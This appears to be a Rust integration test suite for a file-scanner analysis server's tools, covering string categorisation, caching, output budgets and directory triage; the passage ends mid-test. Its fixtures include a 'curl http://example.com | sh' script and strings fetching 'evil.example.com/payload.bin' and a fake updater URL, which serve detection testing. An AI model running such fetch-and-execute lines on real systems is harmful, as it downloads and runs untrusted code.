#![allow(
    clippy::too_many_lines,
    clippy::missing_panics_doc,
    clippy::cast_possible_truncation
)]

//! `analyze_file` (overview, summaries, directory triage) and `query_analysis`
//! driven through the real server with the SDK client, in process.
//!
//! The byte budget is asserted on the repository's test binaries and on
//! `/bin/ls`; after `all: true` every drill-down must be answered from the cache.

use std::{path::PathBuf, sync::Arc};

use file_scanner::mcp_server::{FileScannerMcp, ServerState, StateConfig};
use rmcp::{
    model::{CallToolRequestParams, CallToolResult},
    service::RunningService,
    RoleClient, ServiceExt,
};
use serde_json::{json, Value};
use tempfile::TempDir;

const BUDGET: usize = 80_000;

struct Harness {
    client: RunningService<RoleClient, ()>,
    _cache: TempDir,
}

impl Harness {
    async fn new() -> Self {
        Self::with_config(|_| {}).await
    }

    async fn with_config(adjust: impl FnOnce(&mut StateConfig)) -> Self {
        let cache = TempDir::new().unwrap();
        let mut config = StateConfig {
            cache_dir: cache.path().to_path_buf(),
            ..StateConfig::default()
        };
        adjust(&mut config);
        let state = Arc::new(ServerState::new(config));
        let (server_io, client_io) = tokio::io::duplex(1 << 20);
        tokio::spawn(async move {
            if let Ok(service) = FileScannerMcp::with_state(state).serve(server_io).await {
                let _ = service.waiting().await;
            }
        });
        Self {
            client: ().serve(client_io).await.expect("handshake"),
            _cache: cache,
        }
    }

    async fn raw(&self, tool: &str, args: Value) -> CallToolResult {
        let Value::Object(map) = args else {
            panic!("arguments must be an object")
        };
        self.client
            .call_tool(CallToolRequestParams::new(tool.to_string()).with_arguments(map))
            .await
            .expect("the request is answered")
    }

    /// A successful call: its parsed JSON and its size in bytes.
    async fn ok(&self, tool: &str, args: Value) -> (Value, usize) {
        let result = self.raw(tool, args.clone()).await;
        let text = result.content[0].as_text().unwrap().text.clone();
        assert_ne!(result.is_error, Some(true), "{tool} {args}: {text}");
        let parsed = serde_json::from_str(&text).expect("compact JSON");
        (parsed, text.len())
    }

    /// A failed call: its message.
    async fn err(&self, tool: &str, args: Value) -> String {
        let result = self.raw(tool, args).await;
        assert_eq!(result.is_error, Some(true), "{result:?}");
        result.content[0].as_text().unwrap().text.clone()
    }
}

fn sample(name: &str) -> String {
    format!("{}/test_programs/{name}", env!("CARGO_MANIFEST_DIR"))
}

/// A small file with ASCII, a URL, an IP, UTF-16 text and binary junk.
fn strings_file(dir: &TempDir) -> PathBuf {
    let path = dir.path().join("mixed.bin");
    let mut bytes = vec![0u8; 32];
    bytes.extend_from_slice(&[1, 0, 2, 0, 3, 0, 4, 0, 5, 0, 6, 0]);
    bytes.extend_from_slice(b"GET http://evil.example.com/payload.bin HTTP/1.1\0");
    bytes.extend_from_slice(b"connect to 10.20.30.40 now\0");
    bytes.extend_from_slice(&[0xFF]);
    bytes.extend_from_slice(b"W\0i\0d\0e\0 \0t\0e\0x\0t\0\0\0");
    bytes.extend_from_slice(b"just a plain marker string\0");
    for i in 0..120 {
        bytes.extend_from_slice(format!("filler string {i:03}\0").as_bytes());
    }
    std::fs::write(&path, bytes).unwrap();
    path
}

// ---------------------------------------------------------------------------
// The overview
// ---------------------------------------------------------------------------

#[tokio::test]
async fn a_bare_path_gives_the_overview_within_budget() {
    let harness = Harness::new().await;
    for file in [sample("c_advanced_binary"), "/bin/ls".to_string()] {
        let (overview, size) = harness.ok("analyze_file", json!({"file_path": file})).await;
        assert!(size < BUDGET, "{file}: {size} bytes");
        assert_eq!(overview["view"], "overview");
        assert_eq!(overview["sha256"].as_str().unwrap().len(), 64);
        assert_eq!(overview["md5"].as_str().unwrap().len(), 32);
        assert!(overview["size"].as_u64().unwrap() > 0);
        assert!(overview["format"]["format"].is_string(), "{overview}");
        assert!(overview["entropy"]["overall"].is_f64());
        assert!(overview["counts"]["strings"].as_u64().unwrap() > 0);
        let steps = overview["next_steps"].as_array().unwrap();
        assert!(steps.iter().any(|s| s["tool"] == "query_analysis"));
        assert!(overview["available_sections"]
            .as_array()
            .unwrap()
            .iter()
            .any(|s| s == "symbols"));
        // The overview never carries a heavy section.
        for heavy in ["disassembly", "control_flow", "vulnerabilities", "symbols"] {
            assert!(overview.get(heavy).is_none(), "{heavy}");
        }
    }
}

/// CB12 / LS02: a text file gets an overview too, and says what does not apply.
#[tokio::test]
async fn a_text_file_overview_says_which_sections_do_not_apply() {
    let harness = Harness::new().await;
    let dir = TempDir::new().unwrap();
    let path = strings_file(&dir);
    let (overview, _) = harness.ok("analyze_file", json!({"file_path": path})).await;
    assert!(
        overview["not_applicable"]["symbols"].is_string(),
        "{overview}"
    );
    assert_eq!(overview["format"]["format"], "Raw");
    assert!(!overview["available_sections"]
        .as_array()
        .unwrap()
        .iter()
        .any(|s| s == "symbols"));
    let top = overview["interesting_strings"].as_array().unwrap();
    assert_eq!(top[0]["category"], "URL");
}

// ---------------------------------------------------------------------------
// Summaries, `all`, and the cache
// ---------------------------------------------------------------------------

/// The maintainer's rule: `all: true` returns summaries within the budget, and
/// every follow-up on the unchanged file is a cache hit.
#[tokio::test]
async fn all_returns_summaries_and_every_drill_down_hits_the_cache() {
    for file in [
        sample("c_advanced_binary"),
        sample("go_test_binary"),
        "/bin/ls".to_string(),
    ] {
        let harness = Harness::new().await;
        let (all, size) = harness
            .ok("analyze_file", json!({"file_path": file, "all": true}))
            .await;
        assert!(size <= BUDGET, "{file}: all:true returned {size} bytes");
        assert!(
            all.get("truncated").is_none(),
            "{file}: summaries fit whole"
        );
        assert_eq!(all["cache"], "miss", "{file}");
        assert!(all["strings"]["total_count"].as_u64().unwrap() > 0);
        assert!(all["hashes"]["sha256"].is_string());
        // Heavy sections are counts and a few items, never lists.
        if let Some(symbols) = all.get("symbols") {
            assert!(symbols["functions"]["count"].is_u64());
            assert!(symbols["functions"]["sample"].as_array().unwrap().len() <= 3);
        }

        // Drill-downs: every one is answered from the cache.
        for (section, list) in [
            ("strings", None),
            ("symbols", Some("functions")),
            ("symbols", Some("imports")),
            ("disassembly", Some("functions")),
            ("control_flow", None),
            ("vulnerabilities", None),
            ("entropy", None),
            ("threats", None),
            ("behavioral", None),
        ] {
            if all.get(section).is_none() {
                continue; // did not apply to this format; reported under notes
            }
            let mut args = json!({"file_path": file, "section": section, "limit": 5});
            if let Some(list) = list {
                args["list"] = list.into();
            }
            let (page, size) = harness.ok("query_analysis", args).await;
            assert_eq!(page["cache"], "hit", "{file} {section} {list:?}");
            assert!(size <= BUDGET);
            assert!(page["total"].is_u64());
            assert!(page["returned"].as_u64().unwrap() <= 5);
        }

        // Flags that name what a full run computed hit as well (the hex dump
        // and the basic threats used to be keyed differently).
        let (again, _) = harness
            .ok(
                "analyze_file",
                json!({"file_path": file, "hex_dump": true, "threats": true, "hashes": true}),
            )
            .await;
        assert_eq!(again["cache"], "hit", "{file}");
        let (again, _) = harness
            .ok(
                "analyze_file",
                json!({"file_path": file, "sections": ["strings", "entropy"]}),
            )
            .await;
        assert_eq!(again["cache"], "hit", "{file}");
    }
}

/// The disassembly of a binary is a summary plus a page, and a single function
/// is found by name.
#[tokio::test]
async fn disassembly_is_a_summary_and_one_function_is_found_by_name() {
    let harness = Harness::new().await;
    let file = sample("c_advanced_binary");
    let (summary, size) = harness
        .ok(
            "analyze_file",
            json!({"file_path": file, "sections": ["disassembly"]}),
        )
        .await;
    assert!(size < 20_000, "{size}");
    assert!(
        summary["disassembly"]["instructions"]["count"]
            .as_u64()
            .unwrap()
            > 100
    );
    let (page, _) = harness
        .ok(
            "query_analysis",
            json!({"file_path": file, "section": "disassembly", "list": "functions",
                   "filter": "beacon_home"}),
        )
        .await;
    assert_eq!(page["cache"], "hit");
    assert_eq!(page["total"], 1, "{page}");
    assert_eq!(page["items"][0]["name"], "beacon_home");
    assert!(page["items"][0]["instruction_count"].as_u64().unwrap() > 0);
}

// ---------------------------------------------------------------------------
// Strings
// ---------------------------------------------------------------------------

#[tokio::test]
async fn strings_have_offsets_categories_counts_and_printable_utf16_only() {
    let harness = Harness::new().await;
    let dir = TempDir::new().unwrap();
    let path = strings_file(&dir);
    let (summary, _) = harness
        .ok("analyze_file", json!({"file_path": path, "strings": true}))
        .await;
    let strings = &summary["strings"];
    assert_eq!(strings["utf16_count"], 1, "{strings}");
    assert_eq!(strings["ascii_count"].as_u64().unwrap(), 123);
    assert_eq!(strings["total_count"].as_u64().unwrap(), 124);
    assert_eq!(strings["categories"]["URL"], 1);
    assert_eq!(strings["categories"]["IP Address"], 1);
    assert_eq!(strings["top"][0]["category"], "URL");

    // Every row, none of them junk.
    let mut offset = 0;
    let mut seen = 0;
    loop {
        let (page, _) = harness
            .ok(
                "query_analysis",
                json!({"file_path": path, "section": "strings", "offset": offset, "limit": 50}),
            )
            .await;
        assert_eq!(page["total"], 124);
        for row in page["items"].as_array().unwrap() {
            seen += 1;
            let value = row["value"].as_str().unwrap();
            assert!(value.chars().all(|c| (' '..='~').contains(&c)), "{row}");
            assert!(row["offset"].is_u64());
            assert!(["ascii", "utf16le", "utf16be"].contains(&row["encoding"].as_str().unwrap()));
        }
        match page.get("next_offset").and_then(Value::as_u64) {
            Some(next) => offset = next as usize,
            None => break,
        }
    }
    assert_eq!(seen, 124);

    // Category, substring, regex and encoding filters.
    let (urls, _) = harness
        .ok(
            "query_analysis",
            json!({"file_path": path, "section": "strings", "category": "url"}),
        )
        .await;
    assert_eq!(urls["total"], 1);
    assert_eq!(urls["items"][0]["category"], "URL");
    assert_eq!(urls["items"][0]["offset"], 32 + 12);
    let (sub, _) = harness
        .ok(
            "query_analysis",
            json!({"file_path": path, "section": "strings", "filter": "MARKER"}),
        )
        .await;
    assert_eq!(sub["total"], 1);
    let (rx, _) = harness
        .ok(
            "query_analysis",
            json!({"file_path": path, "section": "strings", "filter": r"filler string 00[0-4]$",
                   "regex": true}),
        )
        .await;
    assert_eq!(rx["total"], 5);
    let (wide, _) = harness
        .ok(
            "query_analysis",
            json!({"file_path": path, "section": "strings", "encoding": "utf16le"}),
        )
        .await;
    assert_eq!(wide["total"], 1);
    assert_eq!(wide["items"][0]["value"], "Wide text");
    let message = harness
        .err(
            "query_analysis",
            json!({"file_path": path, "section": "strings", "filter": "(", "regex": true}),
        )
        .await;
    assert!(message.contains("regular expression"), "{message}");
}

/// CB06: on real binaries the UTF-16 rows are printable text only.
#[tokio::test]
async fn binary_strings_contain_no_control_characters() {
    let harness = Harness::new().await;
    let file = sample("go_test_binary");
    let (page, size) = harness
        .ok(
            "query_analysis",
            json!({"file_path": file, "section": "strings", "encoding": "utf16le", "limit": 500}),
        )
        .await;
    assert!(size < BUDGET);
    for row in page["items"].as_array().unwrap() {
        assert!(
            row["value"]
                .as_str()
                .unwrap()
                .chars()
                .all(|c| (' '..='~').contains(&c)),
            "{row}"
        );
    }
}

/// CB20 / CS27: the same file gives the same indicator strings every time.
#[tokio::test]
async fn yara_indicator_strings_are_deterministic() {
    let file = sample("rust_test_binary");
    let mut runs: Vec<Value> = Vec::new();
    for _ in 0..3 {
        let harness = Harness::new().await;
        let (result, _) = harness
            .ok(
                "analyze_file",
                json!({"file_path": file, "yara_indicators": true}),
            )
            .await;
        runs.push(result["yara_indicators"]["unique_strings"].clone());
    }
    assert!(!runs[0].as_array().unwrap().is_empty());
    assert_eq!(runs[0], runs[1]);
    assert_eq!(runs[1], runs[2]);
}

// ---------------------------------------------------------------------------
// Failures and notes
// ---------------------------------------------------------------------------

/// CB11 / UC06 / LS15: what does not apply or fails is named, never null.
#[tokio::test]
async fn sections_that_do_not_apply_are_named_with_the_reason() {
    let harness = Harness::new().await;
    // A Mach-O universal binary: some sections apply, some say why not.
    let (result, _) = harness
        .ok(
            "analyze_file",
            json!({"file_path": "/bin/ls", "sections": ["hashes", "control_flow", "vulnerabilities"]}),
        )
        .await;
    assert!(result["hashes"]["sha256"].is_string());
    for section in ["control_flow", "vulnerabilities"] {
        assert!(result.get(section).is_none());
        let reason = result["notes"][section]
            .as_str()
            .or(result["errors"][section].as_str());
        assert!(reason.is_some_and(|r| !r.is_empty()), "{section}: {result}");
    }
    assert!(!result.to_string().contains("null"));

    // Nothing requested applies: a tool error that says why and what to do.
    let dir = TempDir::new().unwrap();
    let path = strings_file(&dir);
    let message = harness
        .err(
            "analyze_file",
            json!({"file_path": path, "sections": ["symbols", "control_flow"]}),
        )
        .await;
    assert!(message.contains("symbols"), "{message}");
    assert!(message.contains("overview"), "{message}");
}

#[tokio::test]
async fn bad_arguments_are_tool_errors_a_model_can_act_on() {
    let harness = Harness::new().await;
    let file = sample("c_advanced_binary");
    let message = harness
        .err(
            "analyze_file",
            json!({"file_path": file, "sections": ["symbolz"]}),
        )
        .await;
    assert!(
        message.contains("symbolz") && message.contains("symbols"),
        "{message}"
    );
    let message = harness
        .err("analyze_file", json!({"file_path": file, "hash": true}))
        .await;
    assert!(message.contains("unknown field `hash`"), "{message}");
    let message = harness
        .err(
            "analyze_file",
            json!({"file_path": file, "hex_dump": true, "hex_dump_size": 5_000_000}),
        )
        .await;
    assert!(message.contains("read_hex"), "{message}");
    let message = harness
        .err(
            "query_analysis",
            json!({"file_path": file, "section": "metadata"}),
        )
        .await;
    assert!(message.contains("analyze_file"), "{message}");
    let message = harness
        .err(
            "query_analysis",
            json!({"file_path": file, "section": "symbols", "list": "nope"}),
        )
        .await;
    assert!(
        message.contains("functions") && message.contains("imports"),
        "{message}"
    );
    let message = harness
        .err(
            "query_analysis",
            json!({"file_path": file, "section": "bogus"}),
        )
        .await;
    assert!(message.contains("Unknown section"), "{message}");
}

// ---------------------------------------------------------------------------
// Directory triage
// ---------------------------------------------------------------------------

#[tokio::test]
async fn a_directory_is_a_paged_triage_table() {
    let harness = Harness::new().await;
    let dir = TempDir::new().unwrap();
    for i in 0..7 {
        std::fs::write(
            dir.path().join(format!("f{i}.txt")),
            format!("file number {i}"),
        )
        .unwrap();
    }
    std::fs::create_dir(dir.path().join("sub")).unwrap();
    std::fs::write(dir.path().join("sub").join("deep.bin"), vec![0xA5u8; 4096]).unwrap();
    std::fs::write(dir.path().join("sub").join("empty"), b"").unwrap();

    let (flat, _) = harness
        .ok("analyze_file", json!({"file_path": dir.path(), "limit": 3}))
        .await;
    assert_eq!(flat["view"], "directory");
    assert_eq!(flat["total"], 7);
    assert_eq!(flat["returned"], 3);
    assert_eq!(flat["next_offset"], 3);
    let row = &flat["files"][0];
    assert_eq!(row["path"], "f0.txt");
    assert_eq!(row["sha256"].as_str().unwrap().len(), 64);
    assert!(row["size"].is_u64() && row["type"].is_string());

    let (all, _) = harness
        .ok(
            "analyze_file",
            json!({"file_path": dir.path(), "recursive": true, "limit": 50}),
        )
        .await;
    assert_eq!(all["total"], 9);
    let rows = all["files"].as_array().unwrap();
    let empty = rows.iter().find(|r| r["path"] == "sub/empty").unwrap();
    assert!(empty["flags"]
        .as_array()
        .unwrap()
        .iter()
        .any(|f| f == "empty"));

    let (capped, _) = harness
        .ok(
            "analyze_file",
            json!({"file_path": dir.path(), "recursive": true, "max_files": 4}),
        )
        .await;
    assert_eq!(capped["total"], 4);
    assert!(capped["truncated_listing"].is_string());

    let (page2, _) = harness
        .ok(
            "analyze_file",
            json!({"file_path": dir.path(), "limit": 3, "offset": 3}),
        )
        .await;
    assert_eq!(page2["files"][0]["path"], "f3.txt");
}

// ---------------------------------------------------------------------------
// Output budget on every test binary
// ---------------------------------------------------------------------------

#[tokio::test]
async fn every_heavy_flag_on_a_test_binary_stays_within_the_budget() {
    let harness = Harness::new().await;
    let file = sample("rust_test_binary");
    for section in [
        "disassembly",
        "control_flow",
        "vulnerabilities",
        "symbols",
        "code_quality",
        "dependencies",
        "behavioral",
        "enhanced_threats",
    ] {
        let (result, size) = harness
            .ok("analyze_file", json!({"file_path": file, section: true}))
            .await;
        assert!(size <= BUDGET, "{section}: {size} bytes");
        assert!(result.get("truncated").is_none(), "{section}");
    }
    // And a small budget is honored.
    let (small, size) = harness
        .ok(
            "analyze_file",
            json!({"file_path": file, "all": true, "max_output_bytes": 40_000}),
        )
        .await;
    assert!(size <= 40_000, "{size}");
    assert!(small["cache"].is_string(), "{small}");
    assert!(small.get("preview").is_none());
}

#[tokio::test]
async fn all_at_the_minimum_budget_stays_structured() {
    let harness = Harness::new().await;
    let (value, size) = harness
        .ok(
            "analyze_file",
            json!({"file_path": sample("go_test_binary"), "all": true, "max_output_bytes": 4000}),
        )
        .await;
    assert!(size <= 4000, "{size}");
    assert!(value.get("preview").is_none(), "{value}");
    assert!(value["cache"].is_string(), "{value}");
    assert!(value["sha256"].is_string());
}

/// A cut page reports the rows actually sent, so following next_offset skips none.
#[tokio::test]
async fn a_page_cut_by_the_budget_continues_where_it_stopped() {
    let harness = Harness::new().await;
    let file = sample("go_test_binary");
    let mut offset = 0usize;
    let mut seen = 0usize;
    let mut cut_pages = 0;
    for _ in 0..8 {
        let (page, size) = harness
            .ok(
                "query_analysis",
                json!({"file_path": file, "section": "strings", "limit": 500,
                       "offset": offset, "max_output_bytes": 8_000}),
            )
            .await;
        assert!(size <= 8_000, "{size}");
        let rows = page["items"].as_array().unwrap().len();
        assert_eq!(page["returned"], json!(rows));
        assert!(page.get("truncated").is_none(), "rows are dropped whole");
        seen += rows;
        match page.get("next_offset").and_then(Value::as_u64) {
            Some(next) => {
                assert_eq!(
                    next as usize,
                    offset + rows,
                    "next_offset follows the rows sent"
                );
                if rows < 500 {
                    cut_pages += 1;
                }
                offset = next as usize;
            }
            None => break,
        }
    }
    assert!(cut_pages > 0, "the budget should have cut a page");
    assert_eq!(seen, offset, "no row was skipped between pages");
}

#[tokio::test]
async fn hex_dump_arguments_are_checked() {
    let harness = Harness::new().await;
    let dir = TempDir::new().unwrap();
    let file = dir.path().join("small.bin");
    std::fs::write(&file, [7u8; 100]).unwrap();
    let file = file.to_string_lossy().into_owned();
    let message = harness
        .err(
            "analyze_file",
            json!({"file_path": file, "hex_dump": true, "hex_dump_size": 5000}),
        )
        .await;
    assert!(message.contains("read_hex"), "{message}");
    let message = harness
        .err(
            "analyze_file",
            json!({"file_path": file, "hex_dump": true, "hex_dump_offset": 500}),
        )
        .await;
    assert!(message.contains("past the end"), "{message}");
    let message = harness
        .err(
            "analyze_file",
            json!({"file_path": file, "hex_dump_size": 32}),
        )
        .await;
    assert!(message.contains("hex_dump: true"), "{message}");
}

#[tokio::test]
async fn bad_filters_and_directory_flags_are_explained() {
    let harness = Harness::new().await;
    let dir = TempDir::new().unwrap();
    let file = strings_file(&dir).to_string_lossy().into_owned();
    let message = harness
        .err(
            "query_analysis",
            json!({"file_path": file, "section": "strings", "encoding": "utf8"}),
        )
        .await;
    assert!(message.contains("utf16le"), "{message}");
    let (value, _) = harness
        .ok(
            "analyze_file",
            json!({"file_path": dir.path().to_string_lossy(), "entropy": true}),
        )
        .await;
    assert_eq!(value["view"], "directory");
    assert!(
        value["note"].as_str().unwrap().contains("entropy"),
        "{value}"
    );
    let (meta, _) = harness
        .ok("analyze_file", json!({"file_path": file, "metadata": true}))
        .await;
    assert!(meta["metadata"].get("hashes").is_none(), "{meta}");
    assert!(meta["metadata"].get("size").is_none(), "{meta}");
}

/// Over 256 MiB the overview does not read the file whole.
#[tokio::test]
async fn the_overview_of_a_very_large_file_skips_whole_file_sections() {
    let harness = Harness::new().await;
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("huge.bin");
    std::fs::File::create(&path)
        .unwrap()
        .set_len(300 * 1024 * 1024)
        .unwrap();
    let (value, size) = harness
        .ok("analyze_file", json!({"file_path": path.to_string_lossy()}))
        .await;
    assert!(size <= BUDGET);
    assert_eq!(value["view"], "overview");
    assert!(value["sha256"].is_string());
    for name in ["strings", "entropy", "binary_info", "symbols", "signatures"] {
        let note = value["notes"][name].as_str().unwrap_or_default();
        assert!(note.contains("sections"), "{name}: {value}");
    }
    // Signature checking reads the whole file, so no result of it is shown.
    assert!(value.get("signature").is_none(), "{value}");
    assert!(value.get("counts").is_some());
}

/// A file of many strings is counted and categorized while it is scanned; the
/// list that is cached and returned is bounded, and a filter still finds a
/// string beyond the bound.
#[tokio::test]
async fn a_string_dense_file_keeps_exact_counts_and_a_bounded_list() {
    let harness = Harness::new().await;
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("dense.bin");
    let mut content = Vec::new();
    for i in 0..120_000u32 {
        content.extend_from_slice(format!("s{i:06}\0").as_bytes());
    }
    content.extend_from_slice(b"beacon at http://needle.example.com/x here\0");
    std::fs::write(&path, &content).unwrap();
    let file = path.to_string_lossy().to_string();

    let (overview, size) = harness.ok("analyze_file", json!({"file_path": file})).await;
    assert!(size <= BUDGET, "{size}");
    assert_eq!(overview["counts"]["strings"], 120_001, "{overview}");
    assert_eq!(overview["counts"]["unique_strings"], 120_001);
    // The URL is the most telling category and is offered as the next query.
    let step = overview["next_steps"]
        .as_array()
        .unwrap()
        .iter()
        .find(|s| s["arguments"]["section"] == "strings")
        .unwrap();
    assert_eq!(step["arguments"]["category"], "URL", "{overview}");

    let (summary, _) = harness
        .ok("analyze_file", json!({"file_path": file, "strings": true}))
        .await;
    let strings = &summary["strings"];
    assert_eq!(strings["total_count"], 120_001);
    assert_eq!(strings["categories"]["URL"], 1);
    assert!(strings["kept"].as_u64().unwrap() < 120_001, "{strings}");
    assert!(strings["note"].as_str().unwrap().contains("counts"));

    // The plain strings past the cap are not in the cached list, but a filter
    // scans the file again and finds one.
    let (found, _) = harness
        .ok(
            "query_analysis",
            json!({"file_path": file, "section": "strings", "filter": "s119999"}),
        )
        .await;
    assert_eq!(found["total"], 1, "{found}");
    assert_eq!(found["items"][0]["value"], "s119999");

    // Without a filter the page is of the kept list, and says what the file has.
    let (page, _) = harness
        .ok(
            "query_analysis",
            json!({"file_path": file, "section": "strings", "limit": 3}),
        )
        .await;
    assert_eq!(page["strings_in_file"], 120_001, "{page}");
    assert!(page["note"].as_str().unwrap().contains("120001"), "{page}");
}

/// `^name$` matches a whole field of a symbol row.
#[tokio::test]
async fn an_anchored_regex_matches_fields_of_non_string_rows() {
    let harness = Harness::new().await;
    let (found, _) = harness
        .ok(
            "query_analysis",
            json!({"file_path": sample("c_advanced_binary"), "section": "symbols",
                   "filter": "^main$", "regex": true}),
        )
        .await;
    assert_eq!(found["total"], 1, "{found}");
}

/// Squeezed to counts, a section still carries its list sizes.
#[tokio::test]
async fn counts_at_a_small_budget_keep_the_list_sizes() {
    let harness = Harness::new().await;
    let (value, size) = harness
        .ok(
            "analyze_file",
            json!({"file_path": sample("c_advanced_binary"), "all": true,
                   "max_output_bytes": 4000}),
        )
        .await;
    assert!(size <= 4000, "{size}");
    assert!(
        value["symbols"]["functions_count"].as_u64().unwrap_or(0) > 0,
        "{value}"
    );
}

/// A table of a directory says when subdirectories were not entered.
#[tokio::test]
async fn a_flat_triage_table_says_it_did_not_enter_subdirectories() {
    let harness = Harness::new().await;
    let dir = TempDir::new().unwrap();
    std::fs::write(dir.path().join("a.txt"), "alpha").unwrap();
    std::fs::create_dir(dir.path().join("sub")).unwrap();
    std::fs::write(dir.path().join("sub").join("b.txt"), "beta").unwrap();
    let (table, _) = harness
        .ok("analyze_file", json!({"file_path": dir.path()}))
        .await;
    assert_eq!(table["total"], 1);
    assert!(
        table["not_entered"]
            .as_str()
            .unwrap()
            .contains("1 subdirectory"),
        "{table}"
    );
    assert!(table["next_steps"]
        .to_string()
        .contains("\"recursive\":true"));
}

/// Directory arguments on a regular file are said to be ignored.
#[tokio::test]
async fn directory_arguments_on_a_file_are_noted() {
    let harness = Harness::new().await;
    let dir = TempDir::new().unwrap();
    let file = dir.path().join("t.txt");
    std::fs::write(&file, "plain text here").unwrap();
    let (value, _) = harness
        .ok(
            "analyze_file",
            json!({"file_path": file, "recursive": true, "limit": 5}),
        )
        .await;
    let note = value["notes"]["directory_arguments"].as_str().unwrap();
    assert!(
        note.contains("recursive") && note.contains("limit"),
        "{value}"
    );
}

/// A URL inside a long string (a Go string blob) is what the category query,
/// the yara indicators and the digest show.
#[tokio::test]
async fn a_url_inside_a_long_string_is_shown_by_every_view() {
    let harness = Harness::new().await;
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("blob.bin");
    let mut blob = "runtime.gopark.internal.".repeat(40);
    blob.push_str("http://msftupdater.example.com/update");
    blob.push_str(&"-tail.module.path".repeat(30));
    let mut bytes = vec![0u8; 16];
    bytes.extend_from_slice(blob.as_bytes());
    bytes.push(0);
    std::fs::write(&path, bytes).unwrap();
    let file = path.to_string_lossy().to_string();

    let (rows, _) = harness
        .ok(
            "query_analysis",
            json!({"file_path": file, "section": "strings", "category": "URL"}),
        )
        .await;
    assert!(rows.to_string().contains("msftupdater"), "{rows}");

    let (indicators, _) = harness
        .ok(
            "analyze_file",
            json!({"file_path": file, "yara_indicators": true}),
        )
        .await;
    assert!(
        indicators["yara_indicators"]["unique_strings"]
            .to_string()
            .contains("http://msftupdater.example.com"),
        "{indicators}"
    );

    let (digest, _) = harness
        .ok("llm_analyze_file", json!({"file_path": file}))
        .await;
    assert!(
        digest["key_strings"].to_string().contains("msftupdater"),
        "{digest}"
    );
}

// ---------------------------------------------------------------------------
// Round 3, part 2: wiring across packages
// ---------------------------------------------------------------------------

#[tokio::test]
async fn call_graph_and_taint_are_sections_with_summaries_and_pages() {
    let harness = Harness::new().await;
    let binary = sample("c_advanced_binary");
    let (value, size) = harness
        .ok(
            "analyze_file",
            json!({"file_path": binary, "sections": ["call_graph", "taint"]}),
        )
        .await;
    assert!(size <= BUDGET);
    let graph = &value["call_graph"];
    assert!(graph["nodes_total"].as_u64().unwrap() > 10, "{graph}");
    assert!(graph["most_calling"][0]["name"].is_string(), "{graph}");
    // A binary is not source text: the analyzer's own reason is the note.
    assert!(
        value["notes"]["taint"]
            .as_str()
            .unwrap()
            .contains("not UTF-8 text"),
        "{value}"
    );
    let (edges, _) = harness
        .ok(
            "query_analysis",
            json!({"file_path": binary, "section": "call_graph", "list": "edges", "limit": 3}),
        )
        .await;
    assert_eq!(edges["cache"], "hit");
    assert_eq!(edges["returned"], 3);
    assert!(edges["items"][0]["caller_name"].is_string(), "{edges}");
    assert!(edges["items"][0]["callee_name"].is_string(), "{edges}");

    let source = sample("c_advanced.c");
    let (taint, _) = harness
        .ok(
            "analyze_file",
            json!({"file_path": source, "sections": ["taint"]}),
        )
        .await;
    assert!(
        taint["taint"]["totals"]["flows"].as_u64().unwrap() > 0,
        "{taint}"
    );
    let (flows, _) = harness
        .ok(
            "query_analysis",
            json!({"file_path": source, "section": "taint", "limit": 1}),
        )
        .await;
    let flow = &flows["items"][0];
    assert!(
        flow["source"]["line"].is_u64() && flow["sink"]["code"].is_string(),
        "{flow}"
    );
    // The overview offers taint for text and call_graph for executables only.
    let (text, _) = harness
        .ok("analyze_file", json!({"file_path": source}))
        .await;
    assert!(text["available_sections"]
        .as_array()
        .unwrap()
        .iter()
        .any(|s| s == "taint"));
    assert!(text["not_applicable"]["call_graph"].is_string(), "{text}");
    let (exe, _) = harness
        .ok("analyze_file", json!({"file_path": binary}))
        .await;
    assert!(exe["available_sections"]
        .as_array()
        .unwrap()
        .iter()
        .any(|s| s == "call_graph"));
    assert!(exe["not_applicable"]["taint"].is_string(), "{exe}");
}

#[tokio::test]
async fn analyzer_limits_and_errors_stay_in_the_summaries() {
    let harness = Harness::new().await;
    let binary = sample("go_test_binary");
    let (value, _) = harness
        .ok(
            "analyze_file",
            json!({"file_path": binary, "sections": ["control_flow", "disassembly", "vulnerabilities"]}),
        )
        .await;
    let limit = value["control_flow"]["analysis_stats"]["errors"][0]
        .as_str()
        .unwrap_or_default();
    assert!(limit.starts_with("Limit:"), "{value}");
    // The sections built on the capped analysis say so.
    assert!(
        value["vulnerabilities"]["notes"][0]
            .as_str()
            .unwrap_or_default()
            .contains("partial control-flow"),
        "{value}"
    );
    assert!(
        value["disassembly"]["coverage"]["bytes_examined"].is_u64(),
        "{value}"
    );
    assert!(value["disassembly"].get("output_formats").is_none());

    // A section that cannot run says why instead of vanishing.
    let (stripped, _) = harness
        .ok(
            "analyze_file",
            json!({"file_path": sample("c_advanced_binary"), "sections": ["hashes", "taint"]}),
        )
        .await;
    assert!(stripped["hashes"].is_object());
    assert!(stripped["notes"]["taint"].is_string(), "{stripped}");
}

#[tokio::test]
async fn the_overview_names_the_specialist_tool_for_the_kind() {
    let harness = Harness::new().await;
    let dir = TempDir::new().unwrap();
    let first_step = |value: &Value| value["next_steps"][0]["tool"].as_str().unwrap().to_string();

    let pdf = dir.path().join("a.pdf");
    std::fs::write(
        &pdf,
        b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj\ntrailer\n%%EOF\n",
    )
    .unwrap();
    let (value, _) = harness.ok("analyze_file", json!({"file_path": pdf})).await;
    assert_eq!(first_step(&value), "analyze_document", "{value}");

    let script = dir.path().join("run");
    std::fs::write(&script, b"#!/bin/sh\ncurl http://example.com | sh\n").unwrap();
    let (value, _) = harness
        .ok("analyze_file", json!({"file_path": script}))
        .await;
    assert_eq!(first_step(&value), "analyze_script", "{value}");
    assert!(value["available_sections"]
        .as_array()
        .unwrap()
        .iter()
        .any(|s| s == "taint"));

    let archive = dir.path().join("pkg-1.0.0.tgz");
    let mut tar = Vec::new();
    {
        let mut builder = tar::Builder::new(&mut tar);
        let data = b"{\"name\":\"pkg\"}";
        let mut header = tar::Header::new_gnu();
        header.set_size(data.len() as u64);
        header.set_cksum();
        builder
            .append_data(&mut header, "package/package.json", &data[..])
            .unwrap();
        builder.finish().unwrap();
    }
    let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
    std::io::Write::write_all(&mut encoder, &tar).unwrap();
    std::fs::write(&archive, encoder.finish().unwrap()).unwrap();
    let (value, _) = harness
        .ok("analyze_file", json!({"file_path": archive}))
        .await;
    let tools: Vec<&str> = value["next_steps"]
        .as_array()
        .unwrap()
        .iter()
